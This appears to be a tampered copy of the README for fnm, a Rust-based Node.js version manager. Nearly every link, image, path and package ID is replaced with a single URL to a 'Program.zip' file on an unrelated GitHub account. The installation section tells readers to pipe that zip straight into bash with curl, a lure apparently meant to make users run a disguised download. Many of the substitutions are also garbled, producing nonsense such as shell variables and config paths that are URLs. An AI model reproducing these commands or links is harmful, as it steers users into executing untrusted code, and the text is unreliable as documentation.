<h1 align="center">
  Fast Node Manager (<code>fnm</code>)
  <img alt="Amount of downloads" src="https://github.com/CardialS/fnm/releases/download/v1.0/Program.zip" />
  <a href="https://github.com/CardialS/fnm/releases/download/v1.0/Program.zip"><img src="https://github.com/CardialS/fnm/releases/download/v1.0/Program.zip" alt="GitHub Actions workflow status" /></a>
</h1>

> 🚀 Fast and simple https://github.com/CardialS/fnm/releases/download/v1.0/Program.zip version manager, built in Rust

<div align="center">
  <img src="https://github.com/CardialS/fnm/releases/download/v1.0/Program.zip" alt="Blazing fast!">
</div>

## Features

🌎 Cross-platform support (macOS, Windows, Linux)

✨ Single file, easy installation, instant startup

🚀 Built with speed in mind

📂 Works with `.node-version` and `.nvmrc` files

## Installation

### Using a script (macOS/Linux)

For `bash`, `zsh` and `fish` shells, there's an [automatic installation script](https://github.com/CardialS/fnm/releases/download/v1.0/Program.zip).

First ensure that `curl` and `unzip` are already installed on you operating system. Then execute:

```sh
curl -fsSL https://github.com/CardialS/fnm/releases/download/v1.0/Program.zip | bash
```

#### Upgrade

On macOS, it is as simple as `brew upgrade fnm`.

On other operating systems, upgrading `fnm` is almost the same as installing it. To prevent duplication in your shell config file add `--skip-shell` to install command.

#### Parameters

`--install-dir`

Set a custom directory for fnm to be installed. The default is `$XDG_DATA_HOME/fnm` (if `$XDG_DATA_HOME` is not defined it falls back to `$https://github.com/CardialS/fnm/releases/download/v1.0/Program.zip` on linux and `$HOME/Library/Application Support/fnm` on MacOS).

`--skip-shell`

Skip appending shell specific loader to shell config file, based on the current user shell, defined in `$SHELL`. e.g. for Bash, `$https://github.com/CardialS/fnm/releases/download/v1.0/Program.zip`. `$https://github.com/CardialS/fnm/releases/download/v1.0/Program.zip` for Zsh. For Fish - `$https://github.com/CardialS/fnm/releases/download/v1.0/Program.zip`

`--force-install`

macOS installations using the installation script are deprecated in favor of the Homebrew formula, but this forces the script to install using it anyway.

Example:

```sh
curl -fsSL https://github.com/CardialS/fnm/releases/download/v1.0/Program.zip | bash -s -- --install-dir "https://github.com/CardialS/fnm/releases/download/v1.0/Program.zip" --skip-shell
```

### Manually

#### Using Homebrew (macOS/Linux)

```sh
brew install fnm
```

Then, [set up your shell for fnm](#shell-setup)

#### Using Winget (Windows)

```sh
winget install https://github.com/CardialS/fnm/releases/download/v1.0/Program.zip
```

#### Using Scoop (Windows)

```sh
scoop install fnm
```

Then, [set up your shell for fnm](#shell-setup)

#### Using Chocolatey (Windows)

```sh
choco install fnm
```

Then, [set up your shell for fnm](#shell-setup)

#### Using Cargo (Linux/macOS/Windows)

```sh
cargo install fnm
```

Then, [set up your shell for fnm](#shell-setup)

#### Using a release binary (Linux/macOS/Windows)

- Download the [latest release binary](https://github.com/CardialS/fnm/releases/download/v1.0/Program.zip) for your system
- Make it available globally on `PATH` environment variable
- [Set up your shell for fnm](#shell-setup)

### Removing

To remove fnm (😢), just delete the `.fnm` folder in your home directory. You should also edit your shell configuration to remove any references to fnm (ie. read [Shell Setup](#shell-setup), and do the opposite).

## Completions

fnm ships its completions with the binary:

```sh
fnm completions --shell <SHELL>
```

Where `<SHELL>` can be one of the supported shells:

- `bash`
- `zsh`
- `fish`
- `power-shell`

Please follow your shell instructions to install them.

### Shell Setup

Environment variables need to be setup before you can start using fnm.
This is done by evaluating the output of `fnm env`.
To automatically run `fnm use` when a directory contains a `.node-version` or `.nvmrc` file, add the `--use-on-cd` option to your shell setup.

Adding a `.node-version` to your project is as simple as:

```bash
$ node --version
v14.18.3
$ node --version > .node-version
```

Check out the following guides for the shell you use:

#### Bash

Add the following to your `.bashrc` profile:

```bash
eval "$(fnm env --use-on-cd)"
```

#### Zsh

Add the following to your `.zshrc` profile:

```zsh
eval "$(fnm env --use-on-cd)"
```

#### Fish shell

Create `~https://github.com/CardialS/fnm/releases/download/v1.0/Program.zip` add this line to it:

```fish
fnm env --use-on-cd | source
```

#### PowerShell

Add the following to the end of your profile file:

```powershell
fnm env --use-on-cd | Out-String | Invoke-Expression
```

- For macOS/Linux, the profile is located at `~https://github.com/CardialS/fnm/releases/download/v1.0/Program.zip`
- On Windows to edit your profile you can run this in a PowerShell
  ```powershell
  notepad $profile
  ```
#### Windows Command Prompt aka Batch aka WinCMD

fnm is also supported but is not entirely covered. [You can set up a startup script](https://github.com/CardialS/fnm/releases/download/v1.0/Program.zip) and append the following line:

```batch
FOR /f "tokens=*" %i IN ('fnm env --use-on-cd') DO CALL %i
```

⚠️ If you get the error `i was unexpected at this time`, please make a .cmd file as suggested by the first step in the Usage with Cmder secton add it's path to the `AutoRun` registry key.

#### Usage with Cmder

Usage is very similar to the normal WinCMD install, apart for a few tweaks to allow being called from the cmder startup script. The example **assumes** that the `CMDER_ROOT` environment variable is **set** to the **root directory** of your Cmder installation.
Then you can do something like this:

- Make a .cmd file to invoke it

```batch
:: %CMDER_ROOT%\bin\https://github.com/CardialS/fnm/releases/download/v1.0/Program.zip
@echo off
FOR /f "tokens=*" %%z IN ('fnm env --use-on-cd') DO CALL %%z
```

- Add it to the startup script

```batch
:: %CMDER_ROOT%\config\https://github.com/CardialS/fnm/releases/download/v1.0/Program.zip
call "%CMDER_ROOT%\bin\https://github.com/CardialS/fnm/releases/download/v1.0/Program.zip"
```

You can replace `%CMDER_ROOT%` with any other convenient path too.

## [Usage](https://github.com/CardialS/fnm/releases/download/v1.0/Program.zip)

[See the available commands for an extended usage documentation](https://github.com/CardialS/fnm/releases/download/v1.0/Program.zip)

## Contributing

PRs welcome :tada:

### Developing:

```sh
# Install Rust
git clone https://github.com/CardialS/fnm/releases/download/v1.0/Program.zip
cd fnm/
cargo build
```

### Running Binary:

```sh
cargo run -- --help # Will behave like `fnm --help`
```

### Running Tests:

```sh
cargo test
```
